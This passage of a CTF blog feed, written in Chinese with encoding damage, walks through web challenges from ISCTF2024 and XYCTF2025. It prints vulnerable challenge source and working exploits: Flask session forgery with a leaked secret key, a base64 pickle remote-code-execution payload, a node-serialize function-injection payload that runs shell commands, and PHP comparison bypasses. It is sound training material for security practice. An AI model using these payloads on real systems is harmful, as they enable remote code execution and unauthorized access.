function_">export_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news_title = request.form[<span class="hljs-string">&quot;title&quot;</span>]<br>    result = newslist.export_news(news_title)<br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;news not found&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/add&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)    <br>    serialized_news = request.form[<span class="hljs-string">&quot;serialized_news&quot;</span>]<br>    <span class="hljs-keyword">if</span> newslist.add_news(serialized_news):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to add news&quot;</span>&#125;)<br><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">False</span>, threaded=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>æºç ä¸­ç»™å‡ºäº†SECRET_KEYå¯ä»¥è¿›è¡Œseesionä¼ªé€ ï¼Œä¼ªé€ ç®¡ç†å‘˜èº«ä»½ï¼ŒNewListç±»ä¸­çš„add_news()æ–¹æ³•è¿›è¡Œäº†ååºåˆ—åŒ–å¹¶æ·»åŠ ä¸€æ¡æ–°é—»ï¼ˆé€šè¿‡&#x2F;addè·¯ç”±ï¼Œæäº¤base64ç¼–ç çš„pickleæ•°æ®æ‰“pythonååºåˆ—åŒ–ï¼‰</p><p>å…ˆè¿›è¡Œsessionä¼ªé€ </p><blockquote><p>python flask_session_cookie_manager3.py decode -c â€œ.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.aDRjvg.R4AEzHRJE7VSrm4qh3aemwSLHhoâ€ -s â€œW3l1com_isCTFâ€</p><p>python flask_session_cookie_manager3.py encode -t â€œ{â€˜login_errorâ€™: True, â€˜passwordâ€™: â€˜admin222â€™, â€˜statusâ€™: â€˜adminâ€™, â€˜usernameâ€™: â€˜adminâ€™}â€ -s â€œW3l1com_isCTFâ€</p></blockquote><p>æ›¿æ¢ä¼ªé€ çš„sessionåè®¿é—®&#x2F;adminè·¯ç”±</p><p>æ‰“pythonååºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">eval</span><br><span class="hljs-string">(S&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(payload).decode())<br><br><span class="hljs-comment">#Y2J1aWx0aW5zCmV2YWwKKFMiX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5hcHAuYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhOl9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSkiCnRSLg==</span><br></code></pre></td></tr></table></figure><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>())<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>);<br><br>users=&#123;<span class="hljs-string">&quot;guest&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">auth</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>)&#123;<br>    <span class="hljs-keyword">const</span> user = serialize.<span class="hljs-title function_">unserialize</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>());<br>    <span class="hljs-keyword">if</span> (!user.<span class="hljs-property">username</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/index&#x27;</span>,auth,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;index&quot;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>    password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>    <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å¿…å¡«é¡¹&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (users[username]) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åå·²å­˜åœ¨&#x27;</span>);<br>    &#125;<br>    users[username] = password;  <br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">201</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ç”¨æˆ·æ³¨å†ŒæˆåŠŸ&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;login&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>  password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å¿…å¡«é¡¹&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!(users[username])) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åä¸å­˜åœ¨&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(users[username] === password)&#123;<br>      token=<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(serialize.<span class="hljs-title function_">serialize</span>(&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">false</span>&#125;)).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>      res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>,token, &#123;<br>        <span class="hljs-attr">maxAge</span>: <span class="hljs-number">900000</span>,<br>        <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span><br>      &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/index&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;å¯†ç é”™è¯¯&#x27;</span>);<br>    &#125;<br>  &#125;<br><br>&#125;);<br><br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡å™¨</span><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running at http://localhost:80`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>cookieå¤„æœ‰ååºåˆ—åŒ–ï¼Œä¸”node_serializeçš„0.0.4ç‰ˆæœ¬å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ<a href="https://xz.aliyun.com/news/6780%EF%BC%89">https://xz.aliyun.com/news/6780ï¼‰</a></p><p>payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cat /flag&gt;./views/login.ejs&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error, stdout, stderr)</span>&#123;<span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span>&#125;);&#125;<span class="hljs-params">()</span>&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>base64ç¼–ç åï¼Œæ›¿æ¢cookieï¼Œåˆ·æ–°ç™»å½•é¡µé¢å¾—åˆ°flag</p><h2 id="ezejs"><a href="#ezejs" class="headerlink" title="ezejs"></a>ezejs</h2><h2 id="å°è“é²¨çš„å†’é™©"><a href="#å°è“é²¨çš„å†’é™©" class="headerlink" title="å°è“é²¨çš„å†’é™©"></a>å°è“é²¨çš„å†’é™©</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;isctf2024&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;QAQ&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>) == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;QAQ&#x27;</span>);<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$which</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">echo</span> GWF_HTML::<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;PHP-0817&#x27;</span>, <span class="hljs-string">&#x27;Hacker NoNoNo!&#x27;</span>, <span class="hljs-literal">false</span>);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>parse_str()ï¼šphpä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½œç”¨ä¸ºå°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­</p><p>@parse_str($b)ï¼šè¿™ä¸ªå‡½æ•°ä¸ä¼šæ£€æµ‹å˜é‡$bæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœé€šè¿‡å…¶ä»–æ–¹å¼ä¼ å…¥æ•°æ®ç»™å˜é‡$b,ä¸”å½“å‰$bä¸­æ•°æ®å­˜åœ¨ï¼Œä¼šå°†å…¶ç›´æ¥è¦†ç›–</p><blockquote><p>b&#x3D;a[0]&#x3D;<em>240610708</em></p></blockquote><p>numä¸èƒ½ç­‰äº2024ï¼Œä½†numè½¬åŒ–ä¸ºæ•´æ•°åç­‰äº2024ä¸”numä¸­ä¸èƒ½å«æœ‰å­—æ¯</p><blockquote><p>num&#x3D;2024.1</p></blockquote><p>ç¬¬ä¸€ä¸ªcaseæ²¡æœ‰åŠ breakï¼Œå­—ç¬¦ä¸²flagä¸0åŒ¹é…ï¼ˆ<strong>åœ¨phpä¸­ï¼Œå¯¹äºçº¯æ•°å­—ç±»å‹çš„switchåœ¨é‡åˆ°å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ—¶ä¼šå¼ºåˆ¶intè½¬æ¢</strong>ï¼Œæœ¬é¢˜è½¬æ¢ä¸º0ï¼‰ï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œåˆ°case3è¾“å‡ºflag</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mx.png"></p><h2 id="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤"><a href="#å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤" class="headerlink" title="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤"></a>å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤</h2><h2 id="å°è“é²¨çš„ä¹¦åº—"><a href="#å°è“é²¨çš„ä¹¦åº—" class="headerlink" title="å°è“é²¨çš„ä¹¦åº—"></a>å°è“é²¨çš„ä¹¦åº—</h2><h2 id="å°è“é²¨çš„æ•…äº‹"><a href="#å°è“é²¨çš„æ•…äº‹" class="headerlink" title="å°è“é²¨çš„æ•…äº‹"></a>å°è“é²¨çš„æ•…äº‹</h2><h2 id="å°è“é²¨çš„ç§˜å¯†"><a href="#å°è“é²¨çš„ç§˜å¯†" class="headerlink" title="å°è“é²¨çš„ç§˜å¯†"></a>å°è“é²¨çš„ç§˜å¯†</h2><p>bpç›´æ¥æŠ“åŒ…</p><p><img src="/../images/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mimi.png"></p><h2 id="è“é²¨çš„javaå…¥é—¨è¯¾å ‚"><a href="#è“é²¨çš„javaå…¥é—¨è¯¾å ‚" class="headerlink" title="è“é²¨çš„javaå…¥é—¨è¯¾å ‚"></a>è“é²¨çš„javaå…¥é—¨è¯¾å ‚</h2><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/2301_79700060/article/details/143854365">https://blog.csdn.net/2301_79700060/article/details/143854365</a></p><p><a href="https://www.zijie.fun/2024/11/11/ISCTF2024/">https://www.zijie.fun/2024/11/11/ISCTF2024/</a></p><p><a href="https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/">https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024">https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024</a></p><p><a href="https://nanian-233.github.io/posts/ISCTF2024.html">https://nanian-233.github.io/posts/ISCTF2024.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xyctf2025_webå¤ç°</title>
    <link href="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br><br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span 